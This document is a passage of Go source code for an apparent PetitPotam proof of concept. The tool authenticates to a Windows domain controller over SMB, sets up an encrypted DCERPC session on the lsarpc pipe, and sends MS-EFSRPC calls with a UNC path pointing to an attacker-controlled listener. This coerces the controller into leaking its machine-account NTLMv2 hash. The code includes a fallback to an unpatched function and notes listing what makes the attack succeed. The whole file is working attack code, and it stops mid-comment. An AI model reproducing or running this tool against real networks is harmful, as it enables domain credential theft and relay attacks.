package main

/*
PetitPotam PoC with DCERPC PKT_PRIVACY (Authentication Level 6)

This implementation demonstrates NTLM coercion via MS-EFSRPC with full DCERPC encryption and signing.
The attack triggers a Windows DC to authenticate to an attacker-controlled listener, exposing the
machine account NTLMv2 hash.

CRITICAL SUCCESS FACTORS:
1. Type 1 (Negotiate) MUST include NTLMSSP_NEGOTIATE_TARGET_INFO (0x00800000)
2. Type 1 MUST include NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY (0x00080000)
3. Use lsarpc pipe (not efsrpc) with UUID c681d488-d850-11d0-8c52-00c04fd90f7e
4. NTLMv2 identity: uppercase(username) + domain (domain NOT uppercased)
5. RC4 cipher must be continuous stream (never reset between requests)
6. Encryption order: encrypt stub FIRST, then sign (signature encrypts checksum)

Technical Implementation:
- SMB connection to \\target\IPC$
- Named pipe: \pipe\lsarpc
- DCERPC 3-way handshake: Bind → BindAck → Auth3
- Encrypted MS-EFSRPC call with UNC path to listener
- Server attempts UNC access, triggering NTLM auth to listener

References:
- MS-EFSR: Encrypting File System Remote Protocol
- MS-RPCE: RPC Protocol Extensions
- MS-NLMP: NTLM Authentication Protocol
*/

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"time"
	"unicode/utf16"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
	"golang.org/x/crypto/md4"
)

const (
	// MS-EFSR Interface - CRITICAL: Must use lsarpc pipe, not efsrpc
	// This UUID works with \pipe\lsarpc and is what Python PetitPotam uses
	msEfsrUUID         = "c681d488-d850-11d0-8c52-00c04fd90f7e"
	msEfsrMajorVersion = 1
	msEfsrMinorVersion = 0

	// NDR (Network Data Representation) transfer syntax UUID
	ndrUUID = "8a885d04-1ceb-11c9-9fe8-08002b104860"

	// Named pipe - CRITICAL: Use lsarpc, not efsrpc
	// Despite calling MS-EFSRPC functions, the interface is bound via lsarpc pipe
	efsrpcPipe = "lsarpc"

	// DCERPC packet types (MS-RPCE section 2.2.1.1)
	dcerpcBind    = 11 // Client → Server: Request interface binding
	dcerpcBindAck = 12 // Server → Client: Acknowledge binding
	dcerpcAuth3   = 16 // Client → Server: Complete 3-way auth (no response expected)
	dcerpcRequest = 0  // Client → Server: RPC function call
	dcerpcFault   = 3  // Server → Client: Error response

	// DCERPC packet flags
	dcerpcPfcFirstFrag = 0x01 // First fragment of multi-fragment PDU
	dcerpcPfcLastFrag  = 0x02 // Last fragment of multi-fragment PDU

	// DCERPC authentication
	dcerpcAuthTypeNTLMSSP  = 10 // NTLMSSP authentication
	dcerpcAuthLevelPrivacy = 6  // PKT_PRIVACY: sign + seal (encrypt)

	// SMB2 IOCTL for named pipe operations
	//fsctlPipeTransceive = 0x0011C017
)

// NTLMAuth holds NTLM authentication state for DCERPC PKT_PRIVACY
// This struct maintains the cryptographic state across multiple DCERPC requests.
//
// CRITICAL: The clientSealHandle RC4 cipher is a CONTINUOUS STREAM and must NEVER be reset.
// Each encryption operation (stub, then checksum in signature) uses the continued RC4 stream.
// Resetting the cipher between operations will cause decryption failures on the server.
type NTLMAuth struct {
	user           string // Username for authentication
	password       string // Password for NT hash calculation
	domain         string // Domain name (NOT uppercased in Type 3 message)
	challenge      []byte // 8-byte server challenge from Type 2 (Challenge) message
	flags          uint32 // Negotiated NTLM flags from server's Challenge message
	sessionBaseKey []byte // 16-byte session base key derived from NTLMv2 response
	clientSignKey  []byte // 16-byte signing key: MD5(sessionBaseKey + client signing magic)
	clientSealKey  []byte // 16-byte sealing key: MD5(sessionBaseKey + client sealing magic)
	seqNum         uint32 // Sequence number for DCERPC requests (starts at 0)
	authContextID  uint32 // Auth context ID assigned by server in BindAck
	negotiateMsg   []byte // Complete Type 1 message (saved for MIC calculation)
	challengeMsg   []byte // Complete Type 2 message (saved for MIC calculation)
	listenerIP     string // Listener IP address for constructing TARGET_NAME AV_PAIR

	// CRITICAL: RC4 cipher handle for encryption - MUST be continuous stream
	// Never call rc4.NewCipher() again after initialization - reuse this handle
	// The RC4 stream state persists across all encryption operations:
	//   1. Stub encryption
	//   2. Signature checksum encryption (in same request)
	//   3. Next request's stub encryption
	//   4. Next request's checksum encryption
	//   ... and so on
	clientSealHandle *rc4.Cipher
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: goercer_full <target_ip> <listener_ip> <username> <password> <domain>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	listenerIP := os.Args[2]
	username := os.Args[3]
	password := os.Args[4]
	domain := os.Args[5]

	fmt.Printf("PetitPotam with DCERPC PKT_PRIVACY auth: %s -> %s\n", targetIP, listenerIP)

	// SMB connection
	options := smb.Options{
		Host: targetIP,
		Port: 445,
		Initiator: &spnego.NTLMInitiator{
			User:     username,
			Password: password,
			Domain:   domain,
		},
	}

	session, err := smb.NewConnection(options)
	if err != nil {
		fmt.Printf("Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer session.Close()

	fmt.Println("[+] SMB authenticated")
	// Debug: Check if SMB3 encryption is enabled
	// Access private fields using unsafe or reflection, or check public APIs
	fmt.Printf("[DEBUG] SMB dialect negotiated: checking encryption status\n")

	share := "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		fmt.Printf("TreeConnect failed: %v\n", err)
		os.Exit(1)
	}
	defer session.TreeDisconnect(share)

	// Open named pipe with read+write access (required for WritePipe/ReadPipe)
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskReadControl | smb.FAccMaskSynchronize

	pipe, err := session.OpenFileExt(share, efsrpcPipe, opts)
	if err != nil {
		fmt.Printf("OpenFile failed: %v\n", err)
		os.Exit(1)
	}
	defer pipe.CloseFile()

	fmt.Println("[+] Pipe opened with read+write access, starting DCERPC auth...")

	// Initialize NTLM auth for DCERPC
	auth := &NTLMAuth{
		user:       username,
		password:   password,
		domain:     domain,
		listenerIP: listenerIP,
		seqNum:     0,
	}

	// Perform authenticated DCERPC bind (3-way handshake)
	err = performAuthenticatedBind(&pipe, session, share, efsrpcPipe, auth)
	if err != nil {
		fmt.Printf("DCERPC auth bind failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] DCERPC authentication complete!")

	// Use the SAME pipe that did Auth3 - it has the DCERPC auth context
	// Note: UNC path MUST be null-terminated (like PetitPotam.py does)
	uncPath := "\\\\" + listenerIP + "\\test\\Settings.ini\x00"

	// Try EfsRpcOpenFileRaw first (opnum 0)
	fmt.Println("[-] Sending authenticated EfsRpcOpenFileRaw (opnum 0)...")
	err = sendAuthenticatedEfsRpc(pipe, auth, uncPath, 0)
	if err != nil {
		if err.Error() == "got fault 0x5" || err.Error() == "got RPC_ACCESS_DENIED" {
			fmt.Println("[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!")
			fmt.Println("[+] OK! Trying unpatched function EfsRpcEncryptFileSrv (opnum 4)...")
		}
	}

	// Always try EfsRpcEncryptFileSrv (opnum 4) regardless of first result
	err2 := sendAuthenticatedEfsRpc(pipe, auth, uncPath, 4)
	if err2 != nil {
		err = err2
	}

	if err != nil {
		fmt.Printf("[+] Got error: %v\n", err)
	}

	fmt.Println("[+] Check Responder for callback!")
}

// performAuthenticatedBind performs the 3-way DCERPC authentication handshake
func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share string, pipeName string, auth *NTLMAuth) error {
	// Step 1: Send Bind with NTLM Negotiate
	negotiateMsg := createNTLMNegotiate()
	auth.negotiateMsg = negotiateMsg // Save for MIC calculation
	fmt.Printf("[DEBUG] NTLM Negotiate (%d bytes): %x\n", len(negotiateMsg), negotiateMsg)

	bindReq := createDCERPCBindWithAuth(negotiateMsg)
	fmt.Printf("[DEBUG] Bind packet (%d bytes): %x\n", len(bindReq), bindReq)

	// Use WritePipe/ReadPipe instead of IOCTL to replicate impacket approach
	fmt.Println("[+] Sending Bind via WritePipe...")
	_, err := (*pipe).WritePipe(bindReq)
	if err != nil {
		return fmt.Errorf("bind write failed: %v", err)
	}

	// Read response
	bindAck := make([]byte, 4096)
	n, err := (*pipe).ReadPipe(bindAck)
	if err != nil {
		return fmt.Errorf("bind read failed: %v", err)
	}
	bindAck = bindAck[:n]
	fmt.Printf("[DEBUG] BindAck length: %d\n", len(bindAck))
	if len(bindAck) >= 3 {
		fmt.Printf("[DEBUG] Packet type: %d (expected %d for BindAck)\n", bindAck[2], dcerpcBindAck)
	}
	if len(bindAck) >= 24 {
		fmt.Printf("[DEBUG] First 24 bytes: %x\n", bindAck[:24])
	}

	if len(bindAck) < 24 {
		return fmt.Errorf("response too short: len=%d", len(bindAck))
	}

	if bindAck[2] == 13 { // BindNak
		// BindNak format: header + reject_reason (uint16)
		// The reject reason is in the call_id field for BindNak
		callID := binary.LittleEndian.Uint32(bindAck[12:16])
		fmt.Printf("[DEBUG] Full BindNak: %x\n", bindAck)
		return fmt.Errorf("bind rejected (BindNak) - call_id/reason: 0x%x", callID)
	}

	if bindAck[2] != dcerpcBindAck {
		return fmt.Errorf("unexpected bind response: type=%d", bindAck[2])
	}

	fmt.Println("[+] Received BindAck")

	// Extract NTLM Challenge from BindAck auth trailer
	authLen := binary.LittleEndian.Uint16(bindAck[10:12]) // auth_len is at offset 10
	fmt.Printf("[DEBUG] auth_len = %d\n", authLen)

	if authLen == 0 {
		return fmt.Errorf("no auth data in BindAck")
	}

	// Auth trailer is at the end of the packet
	fragLen := binary.LittleEndian.Uint16(bindAck[8:10])
	fmt.Printf("[DEBUG] frag_len = %d, packet len = %d\n", fragLen, len(bindAck))

	authTrailerStart := int(fragLen) - int(authLen) - 8 // 8 bytes for auth header
	fmt.Printf("[DEBUG] Calculated authTrailerStart = %d\n", authTrailerStart)

	if authTrailerStart < 24 || authTrailerStart+int(authLen)+8 > int(fragLen) {
		return fmt.Errorf("invalid auth trailer position: start=%d, authLen=%d, fragLen=%d", authTrailerStart, authLen, fragLen)
	}

	// Extract auth_context_id from auth trailer (bytes 4-7 of the 8-byte auth header)
	serverAuthContextID := binary.LittleEndian.Uint32(bindAck[authTrailerStart+4 : authTrailerStart+8])
	fmt.Printf("[DEBUG] Server returned auth_context_id: %d (0x%x)\n", serverAuthContextID, serverAuthContextID)

	// Store it for use in subsequent authenticated requests
	auth.authContextID = serverAuthContextID

	challengeMsg := bindAck[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
	auth.challengeMsg = challengeMsg // Save for MIC calculation

	// Parse challenge
	if len(challengeMsg) < 32 {
		return fmt.Errorf("challenge message too short")
	}

	// Extract server challenge (8 bytes at offset 24)
	auth.challenge = challengeMsg[24:32]
	fmt.Printf("[+] Got NTLM challenge: %x\n", auth.challenge)

	// Extract challenge flags (4 bytes at offset 20)
	challengeFlags := binary.LittleEndian.Uint32(challengeMsg[20:24])
	fmt.Printf("[DEBUG] Challenge flags: 0x%08x\n", challengeFlags)
	auth.flags = challengeFlags // Store flags for Authenticate message

	// Step 2: Generate NTLM Authenticate message (manual to get session keys)
	authenticateMsg := createNTLMAuthenticate(auth, challengeMsg)
	if authenticateMsg == nil {
		return fmt.Errorf("failed to create authenticate message")
	}
	fmt.Printf("[DEBUG] Authenticate message (%d bytes): %x\n", len(authenticateMsg), authenticateMsg[:min2(100, len(authenticateMsg))])
	fmt.Printf("[DEBUG] Calculated session keys for encryption\n")

	// Step 3: Send Auth3 - according to impacket research, this DOES get an SMB Write Response
	auth3Req := createDCERPCAuth3(auth, authenticateMsg)
	fmt.Printf("[DEBUG] Sending Auth3 (%d bytes) via WritePipe\n", len(auth3Req))

	// Use WritePipe which waits for SMB Write Response (like impacket's writeFile)
	fmt.Println("[+] Sending Auth3 via WritePipe (should get SMB Write Response)...")
	nAuth3, err := (*pipe).WritePipe(auth3Req)
	if err != nil {
		return fmt.Errorf("Auth3 write failed: %v", err)
	}
	fmt.Printf("[+] Auth3 complete - wrote %d bytes, got SMB Write Response\n", nAuth3)

	return nil
}

func min2(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// createNTLMNegotiate creates an NTLM Negotiate message (Type 1)
//
// CRITICAL SUCCESS FACTORS:
// 1. MUST include NTLMSSP_NEGOTIATE_TARGET_INFO (0x00800000) - Without this, Windows rejects authentication
// 2. MUST include NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY (0x00080000) - Required for NTLMv2
//
// These two flags tell the server we want NTLMv2 with extended security and target info.
// Without them, Windows will return ACCESS_DENIED (0x5) before even attempting coercion.
//
// The flags negotiated here determine what's available in Type 3 (Authenticate).
// Type 3 flags will be: (Type 1 flags) AND (Type 2 Challenge flags)
func createNTLMNegotiate() []byte {
	buf := new(bytes.Buffer)
	buf.WriteString("NTLMSSP\x00")                    // Signature
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Message Type: 1 (Negotiate)

	// CRITICAL FLAGS for NTLMv2 success
	flags := uint32(0x20000000 | // NTLMSSP_NEGOTIATE_128 - 128-bit encryption
		0x40000000 | // NTLMSSP_NEGOTIATE_KEY_EXCH - Exchange session key
		0x02000000 | // NTLMSSP_NEGOTIATE_VERSION - Include version info
		0x00800000 | // NTLMSSP_NEGOTIATE_TARGET_INFO ⚠️ CRITICAL - Request target info (required for NTLMv2)
		0x00080000 | // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY ⚠️ CRITICAL - Use NTLM2 (required for NTLMv2)
		0x00000200 | // NTLMSSP_NEGOTIATE_NTLM - Use NTLM authentication
		0x00000004 | // NTLMSSP_REQUEST_TARGET - Request target name
		0x00000001 | // NTLMSSP_NEGOTIATE_UNICODE - Unicode strings
		0x00000010 | // NTLMSSP_NEGOTIATE_SIGN - Message signing
		0x00000020) // NTLMSSP_NEGOTIATE_SEAL - Message encryption

	binary.Write(buf, binary.LittleEndian, flags)

	// Domain fields (empty)
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Len
	binary.Write(buf, binary.LittleEndian, uint16(0)) // MaxLen
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset

	// Workstation fields (empty)
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Len
	binary.Write(buf, binary.LittleEndian, uint16(0)) // MaxLen
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset

	// VERSION structure (required when VERSION flag is set)
	buf.WriteByte(6)                                       // ProductMajorVersion
	buf.WriteByte(1)                                       // ProductMinorVersion
	binary.Write(buf, binary.LittleEndian, uint16(0x1db1)) // ProductBuild
	buf.WriteByte(0)                                       // Reserved1
	buf.WriteByte(0)                                       // Reserved2
	buf.WriteByte(0)                                       // Reserved3
	buf.WriteByte(15)                                      // NTLMRevisionCurrent

	return buf.Bytes()
}

// createNTLMAuthenticate creates an NTLM Authenticate message (Type 3) with NTLMv2
func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
	// Extract target info from challenge message (at offset 40+)
	// Challenge structure: sig(8) + type(4) + targetNameLen(2) + targetNameMaxLen(2) + targetNameOffset(4) +
	// flags(4) + serverChallenge(8) + reserved(8) + targetInfoLen(2) + targetInfoMaxLen(2) + targetInfoOffset(4) + ...

	targetInfo := createMinimalTargetInfo()

	var hostname []byte
	if len(challengeMsg) > 48 {
		targetInfoLen := binary.LittleEndian.Uint16(challengeMsg[40:42])
		targetInfoOffset := binary.LittleEndian.Uint32(challengeMsg[44:48])
		fmt.Printf("[DEBUG] Challenge targetInfo: len=%d, offset=%d, challengeLen=%d\n", targetInfoLen, targetInfoOffset, len(challengeMsg))
		if int(targetInfoOffset)+int(targetInfoLen) <= len(challengeMsg) {
			targetInfo = challengeMsg[targetInfoOffset : targetInfoOffset+uint32(targetInfoLen)]
			fmt.Printf("[DEBUG] Using extracted targetInfo (%d bytes)\n", len(targetInfo))

			// Extract hostname from targetInfo for TARGET_NAME construction
			hostname = extractHostnameFromTargetInfo(targetInfo)
		}
	}

	// Add TARGET_NAME AV_PAIR for SPN target name validation
	// This is required to avoid ACCESS_DENIED
	// TARGET_NAME uses hostname from Challenge (DC's hostname)
	if len(hostname) > 0 {
		targetInfo = addTargetNameToAVPairs(targetInfo, hostname)
	}
	fmt.Printf("[DEBUG] Added TARGET_NAME AV_PAIR to targetInfo (%d bytes total)\n", len(targetInfo))
	fmt.Printf("[DEBUG] targetInfo hex dump (last 50 bytes): %x\n", targetInfo[len(targetInfo)-50:])
	// Write targetInfo to file for debugging
	os.WriteFile("/tmp/targetinfo_debug.bin", targetInfo, 0644)

	// Calculate NTLMv2 response
	timestamp := time.Now().UnixNano() / 100
	timestamp += 116444736000000000

	clientChallenge := make([]byte, 8)
	rand.Read(clientChallenge) // Use random client challenge

	temp := buildTempBlob(timestamp, clientChallenge, targetInfo)

	ntHash := ntHash(auth.password)
	ntlmv2Hash := ntlmv2Hash(ntHash, auth.user, auth.domain)
	ntlmv2Resp := calculateNTLMv2Response(ntlmv2Hash, auth.challenge, temp)

	// Calculate session keys from this NTLMv2 response
	auth.sessionBaseKey = calculateSessionBaseKey(ntlmv2Hash, ntlmv2Resp[:16])
	auth.clientSignKey = calculateSignKey(auth.sessionBaseKey, true)
	auth.clientSealKey = calculateSealKey(auth.sessionBaseKey, true)

	fmt.Printf("[DEBUG] NTProofStr: %x\n", ntlmv2Resp[:16])
	fmt.Printf("[DEBUG] SessionBaseKey: %x\n", auth.sessionBaseKey)

	// Build Authenticate message manually
	buf := new(bytes.Buffer)
	buf.WriteString("NTLMSSP\x00")
	binary.Write(buf, binary.LittleEndian, uint32(3)) // Type 3

	domainUTF16 := stringToUTF16LE(auth.domain) // Python doesn't uppercase domain in Type 3
	userUTF16 := stringToUTF16LE(auth.user)
	workstationUTF16 := stringToUTF16LE("") // Empty workstation

	// Create NTLMv2 LM response: HMAC-MD5(ntlmv2Hash, serverChallenge + clientChallenge) + clientChallenge
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(auth.challenge)
	h.Write(clientChallenge)
	lmResp := append(h.Sum(nil), clientChallenge...)
	fmt.Printf("[DEBUG] Client challenge (%d bytes): %x\n", len(clientChallenge), clientChallenge)
	fmt.Printf("[DEBUG] LM response (%d bytes): %x\n", len(lmResp), lmResp)
	fmt.Printf("[DEBUG] Server challenge: %x\n", auth.challenge)

	// Calculate base offset: 64-byte standard header + VERSION (8) + MIC (16) if present
	baseOffset := 64
	if auth.flags&0x02000000 != 0 { // VERSION flag set
		baseOffset += 8  // VERSION field
		baseOffset += 16 // MIC field
	}
	offset := baseOffset

	fmt.Printf("[DEBUG] Base offset for payload: %d bytes\n", baseOffset)

	// LM response
	binary.Write(buf, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(buf, binary.LittleEndian, uint16(len(lmResp)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(lmResp)

	// NTLM response
	binary.Write(buf, binary.LittleEndian, uint16(len(ntlmv2Resp)))
	binary.Write(buf, binary.LittleEndian, uint16(len(ntlmv2Resp)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(ntlmv2Resp)

	// Domain
	binary.Write(buf, binary.LittleEndian, uint16(len(domainUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(domainUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(domainUTF16)

	// User
	binary.Write(buf, binary.LittleEndian, uint16(len(userUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(userUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(userUTF16)

	// Workstation
	binary.Write(buf, binary.LittleEndian, uint16(len(workstationUTF16)))
	binary.Write(buf, binary.LittleEndian, uint16(len(workstationUTF16)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(workstationUTF16)

	// Handle session key export (for MIC and subsequent signing/sealing)
	// NTLMSSP_NEGOTIATE_KEY_EXCH = 0x40000000
	var encryptedRandomSessionKey []byte
	var exportedSessionKey []byte

	keyExchangeKey := auth.sessionBaseKey // For NTLMv2, this is the sessionBaseKey

	if auth.flags&0x40000000 != 0 {
		// KEY_EXCH negotiated: generate random session key and encrypt it
		exportedSessionKey = make([]byte, 16)
		rand.Read(exportedSessionKey)

		// Encrypt it with keyExchangeKey
		cipher, _ := rc4.NewCipher(keyExchangeKey)
		encryptedRandomSessionKey = make([]byte, 16)
		cipher.XORKeyStream(encryptedRandomSessionKey, exportedSessionKey)

		fmt.Printf("[DEBUG] KEY_EXCH: Generated random exported session key: %x\n", exportedSessionKey)
		fmt.Printf("[DEBUG] KEY_EXCH: Encrypted session key: %x\n", encryptedRandomSessionKey)
	} else {
		// KEY_EXCH not negotiated: exportedSessionKey = keyExchangeKey (no encryption)
		exportedSessionKey = keyExchangeKey
		encryptedRandomSessionKey = []byte{} // Empty - no encrypted session key field
		fmt.Printf("[DEBUG] NO KEY_EXCH: Using keyExchangeKey as exportedSessionKey: %x\n", exportedSessionKey)
	}

	// Update our signing/sealing keys to use exportedSessionKey
	auth.sessionBaseKey = exportedSessionKey
	auth.clientSignKey = calculateSignKey(exportedSessionKey, true)
	auth.clientSealKey = calculateSealKey(exportedSessionKey, true)

	// Initialize RC4 cipher handle - this MUST be continuous stream (never reset!)
	// This is critical for NTLM - impacket uses the same cipher handle throughout
	auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)

	fmt.Printf("[DEBUG] Final SessionBaseKey (for MIC and crypto): %x\n", auth.sessionBaseKey)
	fmt.Printf("[DEBUG] Final SignKey: %x\n", auth.clientSignKey)
	fmt.Printf("[DEBUG] Final SealKey: %x\n", auth.clientSealKey)

	// Session key
	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
	binary.Write(buf, binary.LittleEndian, uint32(offset))
	offset += len(encryptedRandomSessionKey)

	// Flags - Python includes EXTENDED_SESSIONSECURITY + TARGET_INFO even if not in Type 1
	// Must include these for NTLMv2 to work properly
	type1Flags := uint32(0x62000231) // Our original Type 1 flags
	responseFlags := type1Flags

	// Force EXTENDED_SESSIONSECURITY and TARGET_INFO for NTLMv2
	responseFlags |= 0x00080000 // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
	responseFlags |= 0x00800000 // NTLMSSP_NEGOTIATE_TARGET_INFO

	// Mask out flags that Challenge doesn't support (same as Python)
	if auth.flags&0x20000000 == 0 { // NTLMSSP_NEGOTIATE_128
		responseFlags &= ^uint32(0x20000000)
	}
	if auth.flags&0x40000000 == 0 { // NTLMSSP_NEGOTIATE_KEY_EXCH
		responseFlags &= ^uint32(0x40000000)
	}
	if auth.flags&0x00000020 == 0 { // NTLMSSP_NEGOTIATE_SEAL
		responseFlags &= ^uint32(0x00000020)
	}
	if auth.flags&0x00000010 == 0 { // NTLMSSP_NEGOTIATE_SIGN
		responseFlags &= ^uint32(0x00000010)
	}
	if auth.flags&0x00008000 == 0 { // NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		responseFlags &= ^uint32(0x00008000)
	}

	fmt.Printf("[DEBUG] Type 1 flags: 0x%08x\n", type1Flags)
	fmt.Printf("[DEBUG] Challenge flags (auth.flags): 0x%08x\n", auth.flags)
	fmt.Printf("[DEBUG] Response flags (Type 3): 0x%08x\n", responseFlags)
	binary.Write(buf, binary.LittleEndian, responseFlags)

	// Include VERSION field if NEGOTIATE_VERSION was set (8 bytes)
	if auth.flags&0x02000000 != 0 {
		// NTLM version 6.1.7601.0 (Windows 7/Server 2008 R2)
		buf.WriteByte(6)                                     // Major version
		buf.WriteByte(1)                                     // Minor version
		binary.Write(buf, binary.LittleEndian, uint16(7601)) // Build number
		buf.Write([]byte{0, 0, 0})                           // Reserved
		buf.WriteByte(15)                                    // NTLM revision
	}

	// MIC field (16 bytes) - will be computed later
	if auth.flags&0x02000000 != 0 {
		buf.Write(make([]byte, 16)) // Placeholder for MIC
	}

	buf.Write(lmResp)
	buf.Write(ntlmv2Resp)
	buf.Write(domainUTF16)
	buf.Write(userUTF16)
	buf.Write(workstationUTF16)
	buf.Write(encryptedRandomSessionKey)

	authenticateMsg := buf.Bytes()

	fmt.Printf("[DEBUG] Authenticate message breakdown:\n")
	fmt.Printf("  Header: 64, VERSION: %d, MIC: %d\n", 8, 16)
	fmt.Printf("  LM response: %d bytes\n", len(lmResp))
	fmt.Printf("  NTLM response: %d bytes\n", len(ntlmv2Resp))
	fmt.Printf("  Domain: %d bytes\n", len(domainUTF16))
	fmt.Printf("  User: %d bytes\n", len(userUTF16))
	fmt.Printf("  Workstation: %d bytes\n", len(workstationUTF16))
	fmt.Printf("  Encrypted session key: %d bytes\n", len(encryptedRandomSessionKey))
	fmt.Printf("  Total: %d bytes\n", len(authenticateMsg))

	// Write full authenticate message for analysis
	os.WriteFile("/tmp/go_authenticate.bin", authenticateMsg, 0644)
	fmt.Printf("[DEBUG] Full Authenticate message written to /tmp/go_authenticate.bin\n")
	fmt.Printf("[DEBUG] Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])

	// Compute MIC if VERSION flag is set
	// MIC = HMAC-MD5(exportedSessionKey, Negotiate + Challenge + Authenticate[with MIC zeroed])
	if auth.flags&0x02000000 != 0 && len(exportedSessionKey) > 0 {
		// MIC is the HMAC-MD5 over all three NTLM messages
		// It's placed right after the VERSION field
		micFieldOffset := 64 + 8 // 64-byte header + 8-byte VERSION

		// Calculate MIC: HMAC-MD5(exportedSessionKey, Negotiate + Challenge + Authenticate[with MIC=0])
		// Use exportedSessionKey directly for MIC (this is the session base key, not the signing key)
		h := hmac.New(md5.New, exportedSessionKey)
		h.Write(auth.negotiateMsg)
		h.Write(auth.challengeMsg)
		h.Write(authenticateMsg) // MIC is already zeroed in authenticateMsg
		mic := h.Sum(nil)

		fmt.Printf("[DEBUG] MIC calculated: %x\n", mic)

		// Place MIC in the message
		copy(authenticateMsg[micFieldOffset:micFieldOffset+16], mic)
	}

	fmt.Printf("[DEBUG] Final Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])

	return authenticateMsg
}

// ========== NTLM Cryptographic Functions ==========

// ntHash computes the NT hash (MD4) of a password
// This is the base hash used in NTLM authentication
// Input: plaintext password
// Output: 16-byte MD4 hash
func ntHash(password string) []byte {
	h := md4.New()
	h.Write(stringToUTF16LE(password))
	return h.Sum(nil)
}

// ntlmv2Hash computes the NTLMv2 hash used for authentication
//
// CRITICAL: Only the USERNAME is uppercased, NOT the domain!
// Formula: HMAC-MD5(NT_hash, uppercase(username) + domain)
//
// This is different from some docs which incorrectly show both being uppercased.
// Python impacket does: user.upper().encode('utf-16le') + domain.encode('utf-16le')
//
// Input:
//   - ntHash: 16-byte NT hash of password (from ntHash function)
//   - user: username (will be uppercased)
//   - domain: domain name (will NOT be uppercased)
//
// Output: 16-byte NTLMv2 hash
func ntlmv2Hash(ntHash []byte, user, domain string) []byte {
	h := hmac.New(md5.New, ntHash)
	// CRITICAL: Only uppercase the user, NOT the domain!
	userUpper := uppercaseString(user)
	identity := userUpper + domain
	fmt.Printf("[DEBUG] NTLMv2 identity: user='%s' (upper: '%s') + domain='%s' = '%s'\n", user, userUpper, domain, identity)
	h.Write(stringToUTF16LE(identity))
	return h.Sum(nil)
}

// calculateNTLMv2Response creates the NTLMv2 response (NTProofStr + temp blob)
//
// Formula: HMAC-MD5(ntlmv2Hash, serverChallenge + temp) + temp
//
// The response consists of:
//   - NTProofStr (16 bytes): HMAC-MD5 of challenge + temp blob
//   - temp blob: Contains timestamp, client challenge, targetInfo
//
// Input:
//   - ntlmv2Hash: 16-byte NTLMv2 hash (from ntlmv2Hash function)
//   - serverChallenge: 8-byte server challenge from Type 2 message
//   - temp: Temp blob containing timestamp, client challenge, targetInfo
//
// Output: NTLMv2 response (typically ~302 bytes)
func calculateNTLMv2Response(ntlmv2Hash, serverChallenge, temp []byte) []byte {
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(serverChallenge)
	h.Write(temp)
	resp := h.Sum(nil) // This is the NTProofStr (first 16 bytes of response)
	return append(resp, temp...)
}

// calculateSessionBaseKey derives the session base key from NTLMv2 response
//
// Formula: HMAC-MD5(ntlmv2Hash, NTProofStr)
//
// This key is used to derive signing and sealing keys, and for KEY_EXCH encryption.
//
// Input:
//   - ntlmv2Hash: 16-byte NTLMv2 hash
//   - ntProofStr: First 16 bytes of NTLMv2 response
//
// Output: 16-byte session base key
func calculateSessionBaseKey(ntlmv2Hash, ntProofStr []byte) []byte {
	h := hmac.New(md5.New, ntlmv2Hash)
	h.Write(ntProofStr)
	return h.Sum(nil)
}

// calculateSignKey derives the signing key from session key
//
// Formula: MD5(sessionKey + magic_constant)
//
// The magic constant differs for client-to-server vs server-to-client.
// This key is used in NTLM signature generation (not directly in RC4).
//
// Input:
//   - sessionKey: 16-byte session key (typically exportedSessionKey after KEY_EXCH)
//   - client: true for client-to-server key, false for server-to-client
//
// Output: 16-byte signing key
func calculateSignKey(sessionKey []byte, client bool) []byte {
	var magic string
	if client {
		magic = "session key to client-to-server signing key magic constant\x00"
	} else {
		magic = "session key to server-to-client signing key magic constant\x00"
	}
	h := md5.New()
	h.Write(sessionKey)
	h.Write([]byte(magic))
	return h.Sum(nil)
}

// calculateSealKey derives the sealing (encryption) key from session key
//
// Formula: MD5(sessionKey + magic_constant)
//
// The magic constant differs for client-to-server vs server-to-client.
// This key is used to initialize the RC4 cipher for encryption.
//
// CRITICAL: The RC4 cipher initialized with this key MUST be reused for all
// subsequent encryption operations. Never call rc4.NewCipher() again after
// the initial cipher creation.
//
// Input:
